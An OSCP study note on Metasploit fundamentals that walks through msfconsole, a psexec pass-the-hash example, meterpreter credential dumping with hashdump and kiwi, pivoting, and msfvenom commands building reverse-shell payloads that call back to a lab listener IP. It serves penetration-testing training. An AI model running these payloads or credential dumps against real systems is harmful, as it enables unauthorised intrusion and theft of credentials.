---
title: Metasploit fundamentals
slug: metasploit-fundamentals
aliases: [msf-fundamentals, metasploit-primer]
---

{% raw %}

> **TL;DR:** Metasploit is a framework: a database of exploits + a payload generator (msfvenom) + a session manager. On OSCP you get **one** allowed use of an MSF auto-exploit; that constraint forces you to learn what MSF does so you can do it by hand the other 49 times. This note gives you the floor.

## Layout

```
msfconsole        # the REPL
msfvenom          # payload generator (used standalone too)
msfdb             # postgres-backed loot/host db
~/.msf4/          # config, history, loot, db
```

Start fresh:
```bash
sudo msfdb init
msfconsole -q       # -q = no banner
```

## Mental model

Five object types you'll touch:

| Object | What it is |
|---|---|
| **exploit** | code that triggers a bug to deliver a payload |
| **payload** | what runs after the exploit (shell, meterpreter, exec) |
| **encoder** | obfuscates a payload to dodge bad chars / weak signatures |
| **auxiliary** | scanners, fuzzers, anything that isn't "RCE + payload" |
| **post** | modules that run *on* an active session (cred dump, pivot) |

Each is selected with `use <path>` and configured with `set NAME value`.

## The 12 commands that do 90% of the work

```text
search <term>                  # find modules
use <path-or-number>           # select a module
show options                   # what do I need to set
set RHOSTS 10.10.10.5          # target host(s)
set LHOST tun0                 # my listener (NIC name → resolves IP)
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_https
check                          # safe pre-flight (when module supports it)
run / exploit                  # go
sessions -l                    # list sessions
sessions -i 1                  # interact with session 1
background                     # drop a meterpreter session to background
```

## A worked example — psexec with a stolen hash

```text
msf6 > use exploit/windows/smb/psexec
msf6 exploit(...) > set RHOSTS 10.10.10.7
msf6 exploit(...) > set SMBUser Administrator
msf6 exploit(...) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > set LPORT 443
msf6 exploit(...) > exploit
[*] Sending stage (...)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

See [[psexec-family]] for what's happening on the wire.

## Meterpreter — the 10 commands you'll actually use

```text
sysinfo                # OS, arch, domain
getuid                 # current user
getsystem              # try built-in privesc techniques (often blocked)
hashdump               # SAM hashes (needs SYSTEM)
load kiwi              # mimikatz inside meterpreter
creds_all              # kiwi: dump everything
shell                  # drop to cmd.exe
upload / download
portfwd add -l 8080 -p 80 -r 10.10.10.50    # pivot
run post/multi/recon/local_exploit_suggester
migrate <pid>          # move into a more stable process
```

## msfvenom — payloads without msfconsole

You'll use msfvenom *outside* msfconsole far more than the framework itself.

```bash
# Windows reverse meterpreter, x64, HTTPS (egress-friendly)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=10.10.14.5 LPORT=443 \
  -f exe -o shell.exe

# Linux x64 reverse TCP, plain shell (no meterpreter)
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f elf -o shell.elf

# Raw shellcode for a buffer-overflow harness, exclude null + CRLF
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' \
  -f python -v shellcode
```

You then need a handler to catch the callback:

```text
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST tun0
msf6 > set LPORT 443
msf6 > set ExitOnSession false
msf6 > exploit -j        # -j = background as a job
```

## Workspaces — keep clients separated

```text
workspace -a oscp-exam
workspace oscp-exam      # switch
db_nmap -sV 10.10.10.0/24    # results auto-loaded into the workspace
hosts                    # query
services -p 445          # all SMB across the workspace
```

## OSCP exam rules (current at time of writing — always re-check the official guide)

- **Once** you can run an MSF auto-exploit (`exploit/...`) or a meterpreter post-module.
- msfvenom, multi/handler, and auxiliary scanners are **not** restricted.
- Re-read the *current* exam guide on offsec.com before sitting; rules drift.

## Why this is good even after OSCP
- For OSEP you'll lean on `multi/handler` constantly while delivering custom payloads.
- `psexec_command`, `smb_login`, `smb_enumshares` are the fastest sweep tools you have.
- Reading MSF module source (`/usr/share/metasploit-framework/modules/`) is the cleanest way to learn how exploits work — pure Ruby with clear comments.

## References
- [Offensive Security — Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [Rapid7 Metasploit docs](https://docs.metasploit.com/)
- [Module source tree](https://github.com/rapid7/metasploit-framework/tree/master/modules)
- See also: [[searchsploit-and-public-exploit-workflow]], [[porting-public-exploits]], [[oscp-roadmap]]

{% endraw %}
